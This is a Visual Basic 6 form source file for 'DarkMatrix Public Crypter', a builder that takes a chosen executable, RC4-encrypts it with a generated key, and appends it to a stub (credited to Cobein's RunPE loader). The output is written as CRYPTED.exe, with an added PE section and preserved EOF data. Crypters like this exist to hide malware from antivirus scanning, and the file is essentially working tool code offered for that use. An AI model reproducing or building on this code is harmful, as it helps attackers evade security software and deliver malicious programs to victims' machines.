VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#12.0#0"; "CODEJO~1.OCX"
Begin VB.Form FrmMain 
   BackColor       =   &H00FFFFFF&
   Caption         =   "DarkMatrix Public Crypter"
   ClientHeight    =   2655
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   6255
   Icon            =   "FrmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2655
   ScaleWidth      =   6255
   StartUpPosition =   1  'Fenstermitte
   Begin VB.PictureBox Picture1 
      Appearance      =   0  '2D
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   975
      Left            =   0
      Picture         =   "FrmMain.frx":1082
      ScaleHeight     =   945
      ScaleWidth      =   6225
      TabIndex        =   3
      Top             =   0
      Width           =   6255
      Begin VB.Timer Timer1 
         Interval        =   10
         Left            =   60
         Top             =   60
      End
      Begin XtremeSuiteControls.CommonDialog cdl 
         Left            =   1200
         Top             =   360
         _Version        =   786432
         _ExtentX        =   423
         _ExtentY        =   423
         _StockProps     =   4
      End
   End
   Begin XtremeSuiteControls.GroupBox GroupBox1 
      Height          =   1575
      Left            =   60
      TabIndex        =   0
      Top             =   1020
      Width           =   6135
      _Version        =   786432
      _ExtentX        =   10821
      _ExtentY        =   2778
      _StockProps     =   79
      Caption         =   "Settings:"
      Appearance      =   2
      Begin XtremeSuiteControls.CheckBox cEOF 
         Height          =   255
         Left            =   2760
         TabIndex        =   9
         Top             =   1140
         Width           =   1155
         _Version        =   786432
         _ExtentX        =   2037
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "EOF Support"
         Appearance      =   2
         Value           =   1
      End
      Begin XtremeSuiteControls.FlatEdit TxtFile 
         Height          =   315
         Left            =   120
         TabIndex        =   2
         Top             =   300
         Width           =   4815
         _Version        =   786432
         _ExtentX        =   8493
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Locked          =   -1  'True
         Appearance      =   2
      End
      Begin XtremeSuiteControls.PushButton CmdBro 
         Height          =   315
         Left            =   5040
         TabIndex        =   1
         Top             =   300
         Width           =   975
         _Version        =   786432
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   79
         Caption         =   "&Browse"
         Appearance      =   2
         Picture         =   "FrmMain.frx":A059
      End
      Begin XtremeSuiteControls.PushButton PushButton2 
         Height          =   315
         Left            =   5040
         TabIndex        =   4
         Top             =   1140
         Width           =   975
         _Version        =   786432
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   79
         Caption         =   "&Crypt"
         Appearance      =   2
         Picture         =   "FrmMain.frx":CF55
      End
      Begin XtremeSuiteControls.PushButton PushButton3 
         Height          =   315
         Left            =   4080
         TabIndex        =   5
         Top             =   1140
         Width           =   855
         _Version        =   786432
         _ExtentX        =   1508
         _ExtentY        =   556
         _StockProps     =   79
         Caption         =   "&About"
         Appearance      =   2
         Picture         =   "FrmMain.frx":F2C0
      End
      Begin XtremeSuiteControls.FlatEdit TxtKey 
         Height          =   315
         Left            =   120
         TabIndex        =   7
         Top             =   720
         Width           =   4815
         _Version        =   786432
         _ExtentX        =   8493
         _ExtentY        =   556
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Locked          =   -1  'True
         Appearance      =   2
      End
      Begin XtremeSuiteControls.PushButton PushButton4 
         Height          =   315
         Left            =   5040
         TabIndex        =   8
         Top             =   720
         Width           =   975
         _Version        =   786432
         _ExtentX        =   1720
         _ExtentY        =   556
         _StockProps     =   79
         Caption         =   "&KeyGen"
         Appearance      =   2
         Picture         =   "FrmMain.frx":1224D
      End
      Begin XtremeSuiteControls.Label Label1 
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   1200
         Width           =   2595
         _Version        =   786432
         _ExtentX        =   4577
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Visit: www.dark-matrix.com"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const PH = "<DARKMATRIX>"
Dim i As Integer

Private Sub CmdBro_Click()
With cdl
    .Filter = "Exe-Files | *.exe"
    .FileName = ""
    .ShowOpen
    If Not .FileName = "" Then
        TxtFile.Text = .FileName
    Else
        Exit Sub
    End If
End With
End Sub

Private Sub PushButton2_Click()
Dim Stub As String
Dim File As String
Dim NewFile As String

If Len(TxtFile.Text) < 4 Then
    MsgBox "Select a File!", vbCritical, "Error"
    Exit Sub
End If

Open App.Path & "\stub\stub.exe" For Binary Access Read As #1
    Stub = Space(LOF(1))
    Get #1, , Stub
Close #1

Open TxtFile.Text For Binary Access Read As #1
    File = Space(LOF(1))
    Get #1, , File
Close #1

NewFile = App.Path & "\CRYPTED.exe"

If FileExists(NewFile) = True Then Kill NewFile

Open NewFile For Binary Access Write As #1
Put #1, , Stub
Put #1, , PH
Put #1, , RC4(File, TxtKey)
Put #1, , PH
Put #1, , TxtKey.Text
Put #1, , PH
Close #1

Call AddSection(NewFile, ".FD", Len(PH) + Len(PH) + Len(File), &H40000060)

If cEOF = xtpChecked Then WriteEOFData NewFile, GetEOFDatas(TxtFile.Text)

MsgBox "Crypted File saved to:" & vbCrLf & NewFile
End Sub

Private Sub PushButton3_Click()
MsgBox "Coder: Fuka" & vbCrLf & _
vbCrLf & _
"Credits:" & vbCrLf & _
"Cobein (RunPE)" & vbCrLf & _
"famfamfam.com (Icons)" & vbCrLf & _
vbCrLf & _
vbCrLf & _
"Greetz fly out to:" & _
vbCrLf & _
"Luppa" & vbCrLf & _
"HaZl0oh" & vbCrLf & _
vbCrLf & _
vbCrLf & _
vbCrLf & _
"Visit: www.dark-matrix.com", vbInformation, Me.Caption
End Sub

Private Sub PushButton4_Click()
i = 0
Timer1.Enabled = True
End Sub

Private Sub Timer1_Timer()
If i < 10 Then
    TxtKey.Text = CreateKey(33)
    i = i + 1
Else
    Timer1.Enabled = False
End If
End Sub

Function FileExists(FileName As String) As Boolean
    On Error GoTo ErrorHandler
    ' get the attributes and ensure that it isn't a directory
    FileExists = (GetAttr(FileName) And vbDirectory) = 0
ErrorHandler:
    ' if an error occurs, this function returns False
End Function

